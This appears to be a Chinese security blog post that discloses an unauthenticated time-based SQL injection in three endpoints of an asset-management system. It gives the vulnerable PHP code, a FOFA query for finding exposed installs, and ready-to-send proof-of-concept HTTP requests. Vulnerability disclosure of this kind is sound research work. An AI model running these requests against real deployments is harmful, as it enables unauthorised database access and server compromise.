---
title: "百易云资产管理运营系统 make SQL注入漏洞"
source: https://mrxn.net/jswz/baiyishequ-adminx-make-project_id-sqli.html
asset_dir: assets/百易云资产管理运营系统-make-sql注入漏洞
---

# 百易云资产管理运营系统 make SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/7 08:28
* 1108浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

数据库

安全

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

百易云资产管理运营系统，是专门针对企业不动产资产管理和运营需求而设计的一套综合解决方案。该系统能够覆盖资产的全，包括资产的登记、盘点、评估、处置等多个环节，同时提供强大的运营分析功能，帮助企业优化资产配置，提升运营效率。百易云资产管理运营系统 imaRead.make.php、leaseImaRead.make.php、adminx/leaseTurnoverRead.make.php 接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `body="不要着急，点此"`

# 漏洞分析

深入探索

网络安全课程

技术文章订阅

授权

看下 imaRead.make.php 的业务逻辑实现，其他两个文件也存在类似的代码片段

```
<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
header("Content-type: text/html; charset=utf-8");
require_once ("admin.config.php"); 
require_once ("../service/dict.service.php");
require_once ("../service/imaRead.service.php");
require_once ("../com/util.class.php");
$act = $_GET["act"];
$project_id = $_GET["project_id"];
$ima_type= $_GET["ima_type"];
$fee_month = ($_GET["fee_month"]!="")?$_GET["fee_month"]:date("Y-m",time());
$building_code = $_GET["building_code"];
//$month=strReplace($fee_month,"-","");+

 $dict = new dict();
 $minDays= $dict->getOrgCfgValByKey($project_id,"appcfg_imaReadMinDays","org",0);
$imaRead=new imaRead(); 

 if ($act=="remake") {
          $ireads =  $_POST['feeItem'];
          $ids = arr2str($ireads) ;
          $isImaShare = ($building_code=="imaShare")?1:0 ; 
      $ret=$imaRead->genImaReadBlankByPreRead($ids,$isImaShare ) ;
             wlog( $imaRead->getSql());
            if ($ret<=0) {
                  $errInfo= $imaRead->getErrInfo()  ;
                  $errInfo="操作失败.".$errInfo ;
                } else {
                  $errInfo="生成成功." ;
                } 
 }

//$month=strReplace($fee_month,"-","");
if ($act=="make") {
        if ($project_id!="") {
         $minDays =0 ;//强制
         $isImaShare = ($building_code=="imaShare")?1:0 ; 
         if ($ima_type=="turnover") $isImaShare=2;
                 $ret=$imaRead->genImaMonthReadBlank($project_id,$ima_type,$fee_month,$isImaShare,$minDays);
                 //wlog( $imaRead->getSql());
                 if ($ret<=0) {
                  $errInfo= $imaRead->getErrInfo()  ;
                  $errInfo="操作失败".$errInfo ;
                } else {
                  $errInfo="生成成功." ;
                } 
     }  else 
         $errInfo="项目信息不能为空." ;
}

alertMsg($errInfo); 

?>
```

`$project_id` 是由用户通过 `$_GET["project_id"]` 直接传入的，未经任何过滤或转义直接拼接了 `$project_id` 到 SQL 查询中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

# 漏洞复现

## imaRead.make.php

```
GET /adminx/imaRead.make.php?act=make&ima_type=turnover&building_code=imaShare&fee_month=2025-05&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1
Host: baiyishequ.mrxn.net
```

成功延时 6 秒

代码安全审计

[![百易云资产管理运营系统 make SQL注入漏洞](images/img-001-095037ed1b26.webp)](https://image.mrxn.net/58c7a9d6bc3440f88c625ecb4b6bc3d6.webp)

## leaseImaRead.make.php

```
GET /adminx/leaseImaRead.make.php?act=make&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1
Host: baiyishequ.mrxn.net
```

## leaseTurnoverRead.make.php

```
GET /adminx/leaseTurnoverRead.make.php?project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1
Host: baiyishequ.mrxn.net
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.imaRead.make.php](#toc-5-1-)
* [5.2.leaseImaRead.make.php](#toc-5-2-)
* [5.3.leaseTurnoverRead.make.php](#toc-5-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[百易云资产管理运营系统 make SQL注入漏洞](https://mrxn.net/jswz/baiyishequ-adminx-make-project_id-sqli.html)  
文章链接：<https://mrxn.net/jswz/baiyishequ-adminx-make-project_id-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baiyishequ-adminx-make-project\_id-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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